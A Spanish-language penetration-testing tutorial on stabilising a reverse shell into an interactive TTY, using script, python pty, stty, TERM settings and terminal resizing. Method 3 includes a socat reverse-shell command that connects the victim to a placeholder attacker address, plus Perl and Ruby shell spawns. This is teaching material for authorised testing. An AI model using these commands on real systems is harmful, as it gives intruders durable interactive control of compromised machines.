# Guía de Tratamiento y Estabilización de TTY

El tratamiento de la TTY se realiza para transformar una **shell inversa simple** (que no autocompleta con el tabulador, no permite usar las flechas ni usar atajos como `Ctrl+C`) en una **consola completamente interactiva y estable**.

A continuación se detallan las secuencias de comandos más utilizadas en auditorías de seguridad y hacking ético para estabilizar la terminal según las herramientas disponibles en el sistema víctima.
<img width="1280" height="591" alt="image" src="https://github.com/user-attachments/assets/f9d88e82-bffd-4d6e-bd80-921cca8f37b3" />

---

## 🛠️ Método 1: El proceso estándar (Recomendado)

Es el procedimiento clásico cuando consigues una conexión por Netcat u otra herramienta similar. Se ejecuta dividiendo las acciones entre la máquina víctima y tu máquina atacante.

### Paso 1: En la máquina víctima (Generar la pseudo-terminal)
Ejecuta uno de los siguientes comandos para invocar un entorno interactivo:

* **Usando `script` (El más efectivo y moderno):**
  ```bash
  script /dev/null -c bash
  ```

* **Usando Python (Alternativa clásica):**
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

### Paso 2: En la máquina víctima (Suspender la sesión)
Envía la shell actual al segundo plano de tu sistema operativo:
* Presiona la combinación de teclas: **`Ctrl + Z`**

### Paso 3: En tu máquina atacante (Configurar la consola local)
Tu consola se habrá quedado en espera. Ejecuta lo siguiente para que tu terminal transmita los comandos en crudo y no interprete tus atajos locales:
```bash
stty raw -echo ; fg
```
(Alternativa)
```bash
stty raw -echo; fg
```
*(Al escribir `fg` y presionar Enter, volverás automáticamente a la shell de la máquina víctima, aunque no veas texto de inmediato)*.
<img width="1280" height="591" alt="image" src="https://github.com/user-attachments/assets/f9a17da6-28a9-45fd-a803-e3e5cbdc6eab" />

### Paso 4: En la máquina víctima (Reiniciar y limpiar variables)
Escribe los siguientes comandos dentro de la shell recuperada para restablecer el entorno gráfico y habilitar los atajos:
```bash
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## 📐 Método 2: Ajuste de dimensiones de pantalla (Filas y Columnas)

Si programas como `nano`, `vim` o `top` se ven deformados o cortados, necesitas sincronizar el tamaño de la pantalla.

1. **En tu máquina atacante** (abre otra pestaña de la terminal) averigua tus dimensiones actuales:
   ```bash
   stty size
   ```
   *(Esto devolverá dos números, por ejemplo: `45 180`, que representan filas y columnas).*

2. **En la máquina víctima** (dentro de tu shell tratada), configura esos mismos valores:
   ```bash
   stty rows 45 columns 180
   ```

---

## ⚡ Método 3: Alternativas rápidas en un solo paso

Si el sistema remoto cuenta con las herramientas necesarias instaladas, puedes evitar todo el proceso manual utilizando utilidades avanzadas de red o entornos específicos:

### Usando Socat (Evita todo el tratamiento manual)
Si la víctima tiene `socat`:
* **En tu máquina atacante:**
  ```bash
  socat file:`tty`,raw,echo=0 tcp-listen:4444
  ```

* **En la máquina víctima:**
  ```bash
  socat tcp:IP_ATACANTE:4444 exec:bash,pty,stderr,setsid,sigint,sane
  ```

### Invocación rápida desde otros lenguajes de programación
Si no dispones de Python ni de `script`, puedes intentar forzar la terminal interactiva con estos comandos rápidos:

* **Perl:**
  ```bash
  perl -e 'exec "/bin/bash";'
  ```

* **Ruby:**
  ```bash
  ruby -e 'exec "/bin/bash"'
  ```

---

## 📌 Notas importantes

- Estos métodos son fundamentales en auditorías de seguridad y pruebas de penetración autorizadas.
- Asegúrate de tener permiso explícito antes de realizar cualquier prueba en sistemas que no sean de tu propiedad.
- La estabilización de TTY mejora significativamente la experiencia de trabajo en shells remotas.
